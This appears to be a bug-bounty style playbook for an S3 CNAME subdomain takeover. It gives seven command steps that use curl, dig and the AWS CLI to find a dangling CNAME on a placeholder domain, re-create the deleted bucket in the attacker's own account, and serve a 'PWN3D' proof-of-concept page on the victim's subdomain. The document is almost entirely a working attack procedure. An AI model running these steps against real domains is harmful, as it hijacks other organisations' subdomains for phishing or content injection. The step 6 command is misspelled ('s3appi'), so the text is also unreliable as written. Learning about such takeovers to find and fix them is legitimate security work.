# Direct S3 CNAME Takeover

Resource: https://blogs.jsmon.sh/hunting-dangling-dns-how-to-exploit-aws-elastic-ips-cloudfront-and-s3/

## Steps

### 1) Verify that the bucket is gone

Vulnerable Indicator: NoSuchBucket

    curl -s http://assets.pwned.com | grep -i NoSuchBucket

### 2) Get the exact bucket name from the CNAME or error body

Expected result: assets-pwned-com.s3-website-us-east-1.amazonaws.com

    dig CNAME assets.pwned.com

### 3) Create the bucket in your own AWS account (same region)

    aws s3api create-bucket --bucket assets-pwned-com --region us-east-1

### 4) Enable static website hosting

    aws s3 website s3://assets-pwned-com/ --index-document index.html

### 5) Upload PoC

    echo '<p>PWN3D — [your handle] — [date]</p>' > poc.html

Then

    aws s3 cp poc.html s3://assets-pwned-com/ --acl public-read

### 6) Apply public read policy

    aws s3appi put-bucket-policy --bucket assets-pwned-com --policy '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": "*",
        "Action": "s3:GetObject",
        "Resource": "arn:aws:s3:::assets-pwned-com/*"
      }]
    }'

### 7) Visit your PoC file

    http://assets.pwned.com/poc.html
